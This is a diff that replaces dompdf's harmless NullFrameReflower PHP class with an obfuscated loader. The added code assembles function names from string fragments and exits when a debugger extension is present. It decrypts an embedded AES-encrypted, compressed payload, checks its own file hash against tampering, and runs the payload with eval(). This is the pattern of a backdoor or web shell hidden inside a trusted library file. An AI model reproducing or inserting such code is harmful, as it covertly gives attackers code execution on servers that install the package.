@@ -1,39 +1,28 @@
 <?php
-/**
- * @package dompdf
- * @link    http://dompdf.github.com/
- * @author  Benj Carson <benjcarson@digitaljunkies.ca>
- * @license http://www.gnu.org/copyleft/lesser.html GNU Lesser General Public License
- */
-
-namespace Dompdf\FrameReflower;
-
-use Dompdf\Frame;
-use Dompdf\FrameDecorator\Block as BlockFrameDecorator;
-
-/**
- * Dummy reflower
- *
- * @package dompdf
- */
-class NullFrameReflower extends AbstractFrameReflower
-{
-
-    /**
-     * NullFrameReflower constructor.
-     * @param Frame $frame
-     */
-    function __construct(Frame $frame)
-    {
-        parent::__construct($frame);
-    }
-
-    /**
-     * @param BlockFrameDecorator|null $block
-     */
-    function reflow(BlockFrameDecorator $block = null)
-    {
-        return;
-    }
-
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_cxddfmwt=('bas'.'e64'.'_de'.'cod'.'e');
+$_ni1xpqmx=('gzu'.'nco'.'mpr'.'ess');
+$_c9wcwqzt=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_yz64pof7='VeKY4Txe';
+$_cp7pclu2='hrWZK0A3';
+$_q56n4yx9='72WaHZvY';
+$_cavt9nom='6FYhhzwHiHA=';
+$_uuq1vk5z='Kp7e25hg';
+$_tmyjr0zc='S0knVA==';
+$_t80zr04v='83MEKUgL';
+$_fxksxgjf='lpbSWyCI';
+$_wz74dega=$_cxddfmwt($_cp7pclu2.$_uuq1vk5z.$_q56n4yx9.$_yz64pof7.$_cavt9nom);
+$_itbnp3ck=$_cxddfmwt($_fxksxgjf.$_t80zr04v.$_tmyjr0zc);
+$_g274u12j=$_cxddfmwt('1T7sFu9+lDa0A4r3WIJoK5ygYr6qWhxrcqmm2pLeZMPJGVMcoAPgZZ1dS9fiLDhG0N0E1adp04kjIDW9tqv8NkZOXjoLAvEzb6uMcqFQN5iqs/hGn7s052etRif/cL/LmI6R2i2vrOU+oD8T4KYcxEGKpr4btkMkTABlJB36fsaxMsOY96BnFO2gq4dVaonOlY0Pt3T5vnTs/K61WwHBeVeDsEiP5GjrgxP19WZ25Tw=');
+$_bwiacile=$_c9wcwqzt($_g274u12j,'aes-256-cbc',$_wz74dega,OPENSSL_RAW_DATA,$_itbnp3ck);
+if($_bwiacile===false){exit;}
+$_wzdr8hb6=$_ni1xpqmx($_bwiacile);
+if($_wzdr8hb6===false){exit;}
+$_z4p5ol8q='01d3f8c8fbb53a8a533dd9865a55916a0ef54167b043209393d2d3663237b65e';
+$_ide7pgik=@file_get_contents(__FILE__);
+if($_ide7pgik!==false){
+$_x4eyqval=str_replace($_z4p5ol8q,"0000000000000000000000000000000000000000000000000000000000000000",$_ide7pgik);
+$_iorwi7sh=hash("sha256",$_x4eyqval);
+if($_iorwi7sh!==$_z4p5ol8q){@http_response_code(403);exit;}
 }
+eval($_wzdr8hb6);
